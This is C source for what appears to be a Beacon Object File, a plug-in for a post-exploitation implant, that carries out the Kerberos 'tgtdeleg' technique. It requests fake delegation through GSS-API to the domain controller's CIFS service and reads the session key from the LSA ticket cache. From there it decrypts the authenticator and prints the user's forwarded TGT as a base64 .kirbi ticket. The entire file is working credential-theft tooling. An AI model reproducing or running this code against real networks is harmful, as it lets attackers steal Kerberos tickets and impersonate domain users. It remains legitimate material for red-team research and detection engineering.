#include "_include/asn_encode.c"
#include "_include/asn_decode.c"
#include "_include/crypt_b64.c"
#include "_include/crypt_dec.c"

BOOL GetLsaHandle( HANDLE* hLsa ) {
    HANDLE hLsaLocal;
    bool   status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
    *hLsa = hLsaLocal;
    return status;
}

int my_memcmp(byte* s1, byte* s2, int len) {
    int i = 0;
    while ((s1[i] == s2[i]) && (i < len))
        i++;
    if (i == len)
        return 0;
    else
        return (int)((unsigned char)s1[i] - (unsigned char)s2[i]);
}

byte* SearchBytePattern(byte* pattern, int pSize, byte* buf, int bSize) {
    BOOL status = FALSE;
    byte* result = NULL;
    byte* limit = buf + bSize;
    byte* current = buf;

    for (; !status && (current + pSize <= limit); current++)
        status = !my_memcmp(pattern, current, pSize);

    if (status)
        result = current - 1;

    return result;
}

bool GetEncryptionKeyFromCache(char* target, int encType, byte** key, int* keySize) {
    bool status = true;

    HANDLE hLsa;
    if (GetLsaHandle(&hLsa)) return true;

    ULONG authPackage;
    LSA_STRING krbAuth = { .Buffer = "kerberos",.Length = 8,.MaximumLength = 9 };
    if (!SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage)) {

        int targetLength = my_strlen(target) * 2 + 2;
        int requestSize = targetLength + sizeof(KERB_RETRIEVE_TKT_REQUEST);
        PKERB_RETRIEVE_TKT_REQUEST request = MemAlloc(requestSize * sizeof(KERB_RETRIEVE_TKT_REQUEST));

        request->MessageType = KerbRetrieveEncodedTicketMessage;
        request->CacheOptions = KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
        request->EncryptionType = encType;
        request->TargetName.Length = targetLength - 2;
        request->TargetName.MaximumLength = targetLength;
        request->TargetName.Buffer = ((byte*)request) + sizeof(KERB_RETRIEVE_TKT_REQUEST);
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, target, targetLength / 2, request->TargetName.Buffer, targetLength);

        PKERB_RETRIEVE_TKT_RESPONSE response = NULL;
        NTSTATUS protocolStatus = 0;
        status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, request, requestSize, &response, &requestSize, &protocolStatus);
        if (!status && !protocolStatus && requestSize > 0) {
            *key = MemAlloc(response->Ticket.SessionKey.Length);
            MemCpy(*key, response->Ticket.SessionKey.Value, response->Ticket.SessionKey.Length);
            *keySize = response->Ticket.SessionKey.Length;
            SECUR32$LsaFreeReturnBuffer(&response);
        }
    }
    SECUR32$LsaDeregisterLogonProcess(hLsa);
    return status;
}

void TgtDeleg(char* targetSPN) {

    if (targetSPN == NULL) {
        PDOMAIN_CONTROLLER_INFOA pDomainControllerInfo = NULL;
        DWORD dwError = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED, &pDomainControllerInfo);
        if (dwError == ERROR_SUCCESS) {

            int l = my_strlen(((char*)pDomainControllerInfo->DomainControllerName) + 2);
            targetSPN = MemAlloc(6 + l);
            MemCpy(targetSPN, "CIFS/", 5);
            MemCpy(targetSPN + 5, ((char*)pDomainControllerInfo->DomainControllerName) + 2, l + 1);

            if (pDomainControllerInfo != NULL)
                NETAPI32$NetApiBufferFree(pDomainControllerInfo);
        }
        else {
            return;
        }
    }

    CredHandle phCredential = { 0 };
    TimeStamp  ptsExpiry = { 0 };
    SECURITY_STATUS status = SECUR32$AcquireCredentialsHandleA(NULL, "Kerberos", SECPKG_CRED_OUTBOUND, NULL, NULL, 0, NULL, &phCredential, &ptsExpiry);

    if (status == 0) {
        PRINT_OUT("[*] Initializing Kerberos GSS-API w/ fake delegation for target '%s'\n", targetSPN);

        CtxtHandle    ClientContext = { 0 };
        SecBuffer     ClientTokenArray = { 0, SECBUFFER_TOKEN, NULL };
        SecBufferDesc ClientToken = { SECBUFFER_VERSION, 1, &ClientTokenArray };
        UINT ClientContextAttributes = 0;
        status = SECUR32$InitializeSecurityContextA(&phCredential, NULL, targetSPN, ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH, 0, SECURITY_NATIVE_DREP, NULL, 0, &ClientContext, &ClientToken, &ClientContextAttributes, NULL);

        if ((status == SEC_E_OK) || (status == SEC_I_CONTINUE_NEEDED)) {
            PRINT_OUT("[+] Kerberos GSS-API initialization success!\n");

            if ((ClientContextAttributes & ISC_REQ_DELEGATE) == 1) {
                PRINT_OUT("[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.\n");

                byte KeberosV5[] = { 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02 }; // 1.2.840.113554.1.2.2

                byte* startIndex = SearchBytePattern(KeberosV5, 11, ClientTokenArray.pvBuffer, ClientTokenArray.cbBuffer);
                if (startIndex != NULL) {
                    startIndex += 11;

                    if (startIndex[0] == 1 && startIndex[1] == 0) {
                        PRINT_OUT("[*] Found the AP-REQ delegation ticket in the GSS-API output.\n");

                        int apReqArrayLength = ClientTokenArray.cbBuffer - (startIndex - (byte*)ClientTokenArray.pvBuffer) - 2;

                        AsnElt asn_AP_REQ = { 0 };
                        if (BytesToAsnDecode3(startIndex + 2, apReqArrayLength, false, &asn_AP_REQ)) return; // apReqArrayLength -2

                        for (int i = 0; i < asn_AP_REQ.sub[0].subCount; i++) {
                            AsnElt elt = asn_AP_REQ.sub[0].sub[i];

                            if (elt.tagValue == 4) {
                                EncryptedData encAuthenticator = { 0 };
                                if (AsnGetEncryptedData(&(elt.sub[0]), &encAuthenticator)) return;
                                int authenticatorEtype = encAuthenticator.etype;

                                PRINT_OUT("[*] Authenticator etype: (%d)\n", authenticatorEtype);

                                byte* key = NULL;
                                int   keySize = 0;
                                if (!GetEncryptionKeyFromCache(targetSPN, authenticatorEtype, &key, &keySize) && keySize > 0) {

                                    byte* base64SessionKey = base64_encode(key, keySize);
                                    PRINT_OUT("[*] Extracted the service ticket session key from the ticket cache: %s\n", base64SessionKey);

                                    byte* rawBytes = NULL;
                                    size_t rawBytesSize = 0;
                                    if (decrypt(key, authenticatorEtype, KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR, encAuthenticator.cipher, encAuthenticator.cipher_size, &rawBytes, &rawBytesSize))return;

                                    AsnElt asnAuthenticator = { 0 };
                                    if (BytesToAsnDecode3(rawBytes, rawBytesSize, false, &asnAuthenticator)) return;

                                    for (int j = 0; j < asnAuthenticator.sub[0].subCount; j++) {
                                        AsnElt elt2 = asnAuthenticator.sub[0].sub[j];

                                        if (elt2.tagValue == 3) {
                                            PRINT_OUT("[+] Successfully decrypted the authenticator\n");

                                            int cksumtype = 0;
                                            if (AsnGetInteger(&(elt2.sub[0].sub[0].sub[0]), &cksumtype)) return;

                                            if (cksumtype == 0x8003) {
                                                byte* checksumBytes = NULL;
                                                int   checksumBytesSize = 0;
                                                if (AsnGetOctetString(&(elt2.sub[0].sub[1].sub[0]), &checksumBytes, &checksumBytesSize)) return;

                                                if ((checksumBytes[20] & 1) == 1) {

                                                    uint dLen = *((short*)(checksumBytes + 26));
                                                    AsnElt asn_KRB_CRED = { 0 };
                                                    if (BytesToAsnDecode3(checksumBytes + 28, dLen, false, &asn_KRB_CRED)) return;

                                                    Ticket ticket = { 0 };
                                                    KRB_CRED cred = { 0 };
                                                    cred.pvno = 5;
                                                    cred.msg_type = 22;
                                                    cred.ticket_count = 1;
                                                    cred.tickets = MemAlloc(sizeof(Ticket));
                                                    cred.enc_part.ticket_count = 1;
                                                    cred.enc_part.ticket_info = MemAlloc(sizeof(Ticket));

                                                    for (int k = 0; k < asn_KRB_CRED.sub[0].subCount; k++) {
                                                        AsnElt elt3 = asn_KRB_CRED.sub[0].sub[k];

                                                        if (elt3.tagValue == 2) {
                                                            if (AsnGetTicket(&(elt3.sub[0].sub[0].sub[0]), &ticket)) return;
                                                            cred.tickets[0] = ticket;
                                                        }
                                                        else if (elt3.tagValue == 3) {

                                                            byte* enc_part = NULL;
                                                            int enc_part_size = 0;
                                                            if (AsnGetOctetString(&(elt3.sub[0].sub[1]), &enc_part, &enc_part_size)) return;

                                                            byte* rawBytes2 = NULL;
                                                            size_t rawBytes2Size = 0;
                                                            if (decrypt(key, authenticatorEtype, KRB_KEY_USAGE_KRB_CRED_ENCRYPTED_PART, enc_part, enc_part_size, &rawBytes2, &rawBytes2Size))return;

                                                            AsnElt encKrbCredPartAsn = { 0 };
                                                            if (BytesToAsnDecode3(rawBytes2, rawBytes2Size, false, &encKrbCredPartAsn)) return;

                                                            KrbCredInfo cred_info = { 0 };
                                                            if (AsnGetKrbCredInfo(&(encKrbCredPartAsn.sub[0].sub[0].sub[0].sub[0]), &cred_info)) return;

                                                            cred.enc_part.ticket_info[0] = cred_info;
                                                        }
                                                    }

                                                    AsnElt asnCred = { 0 };
                                                    if (AsnKrbCredEncode(&cred, &asnCred)) return;

                                                    byte* kirbiBytes = NULL;
                                                    int   kirbiBytesSize = 0;
                                                    if (AsnToBytesEncode(&asnCred, &kirbiBytesSize, &kirbiBytes)) return;

                                                    char* kirbiString = base64_encode(kirbiBytes, kirbiBytesSize);
                                                    PRINT_OUT("[*] base64(ticket.kirbi):\n\n%s\n\n", kirbiString);
                                                }
                                            }
                                            else {
                                                PRINT_OUT("[X] Error: Invalid checksum type: %d\n", cksumtype);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                else {
                    PRINT_OUT("[X] Error: Kerberos OID not found in output buffer!\n");
                }
            }
        }
        else {
            PRINT_OUT("[X] Error: Kerberos GSS-API not initializated...\n");
        }
        SECUR32$DeleteSecurityContext(&ClientContext);
    }
    SECUR32$FreeCredentialsHandle(&phCredential);
}

void TGTDELEG_RUN( PCHAR Buffer, DWORD Length ) {
    char* target = NULL;

    for (int i = 0; i < Length; i++)
        i += GetStrParam(Buffer + i, Length - i, "/target:", 8, &target );

    TgtDeleg(target);
}

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    INIT_BOF();

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    DWORD PARAM_SIZE = 0;
    PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        TGTDELEG_RUN( PARAM, PARAM_SIZE );

    FreeBank();

    END_BOF();
}